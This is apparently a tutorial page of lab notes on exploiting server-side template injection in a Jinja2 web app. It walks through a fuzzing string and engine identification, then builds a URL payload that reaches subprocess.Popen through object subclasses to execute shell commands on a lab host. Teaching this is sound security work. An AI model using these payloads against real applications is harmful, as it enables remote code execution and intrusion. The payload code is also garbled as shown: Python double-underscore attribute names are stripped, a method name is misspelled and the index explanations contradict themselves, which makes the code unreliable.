# SSTI

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

## Detection

### Finding an injection point

There are a few places we can look within an application, such as the URL or an input box (make sure to check for hidden inputs).

In this example, there is a page that stores information about a user: `http://10.10.96.9:5000/profile/<user>`, which takes in user input.

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

### Fuzzing

Fuzzing Fuzzing is a technique to determine whether the server is vulnerable by sending multiple characters in hopes to interfere with the backend system.

Luckily for us, most template engines will use a similar character set for their "special functions" which makes it relatively quick to detect if it's vulnerable to SSTI.

For example, the following characters are known to be used in quite a few template engines:

&#x20;`${{<%[%'"}}%`.

The fuzzing process looks as follows:

<figure><img src="../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Continue with this process until you either get an error, or some characters start disappearing from the output.

## Identification

Now that we have detected what characters caused the application to error, it is time to identify what template engine is being used.

In the best case scenario, the error message will include the template engine, which marks this step complete!

However, if this is not the case, we can use a decision tree to help us identify the template engine:

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

## Syntax

After having identified the template engine, we now need to learn its syntax.

{% hint style="success" %}
Where better to learn than the official documentation?
{% endhint %}

## Exploitation

At this point, we know:

```
- The application is vulnerable to SSTI
- The injection point
- The template engine
- The template engine syntax
```

### Planning

Let's first plan how we would like to exploit this vulnerability.

Since Jinja2 is a Python based template engine, we will look at ways to run shell commands in Python. A quick Google search brings up a blog that details different ways to run shell commands. I will highlight a few of them below:

```python
# Method 1
import os
os.system("whoami")

# Method 2
import os
os.popen("whoami").read()

# Method 3
import subprocess
subprocess.Popen("whoami", shell=True, stdout=-1).communicate()
```

### Crafting a proof of concept (Generic)

Combining all of this knowledge, we are able to build a proof of concept (POC).

```python
{{ os.system("whoami") }}.
```

{% hint style="warning" %}
Note: Jinja2 is essentially a sub language of Python that doesn't integrate the import statement, which is why the above does not work.
{% endhint %}

### Crafting a proof of concept (Jinja2)

Python allows us to call the current class instance with `.`**`class`**, we can call this on an empty string:

```
http://10.10.96.9:5000/profile/{{ ''.class }}
```

Classes in Python have an attribute called `.`**`mro`** that allows us to climb up the inherited object tree:

```
http://10.10.96.9:5000/profile/{{ ''.class.mro }}
```

Since we want the root object, we can access the second property (first index):

```
http://10.10.96.9:5000/profile/{{ ''.class.mro[1] }}
```

Objects in Python have a method called `.`**`subclassess`** that allows us to climb down the object tree:

```
http://10.10.96.9:5000/profile/{{ ''.class.mro[1].subclasses() }}
```

Now we need to find an object that allows us to run shell commands. Doing a Ctrl-F for the modules in the code above yields us a match:

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

As this whole output is just a Python list, we can access this by using its index. You can find this by either trial and error, or by counting its position in the list.

In this example, the position in the list is 400 (index 401):

```
http://10.10.96.9:5000/profile/{{ ''.class.mro[1].subclasses()[401] }}
```

The above payload essentially calls the subprocess.Popen method, now all we have to do is invoke it (use the code above for the syntax)

{% code overflow="wrap" %}
```
 http://10.10.96.9:5000/profile/{{ ''.class.mro[1].subclasses()[401]("whoami", shell=True, stdout=-1).communicate() }}
```
{% endcode %}
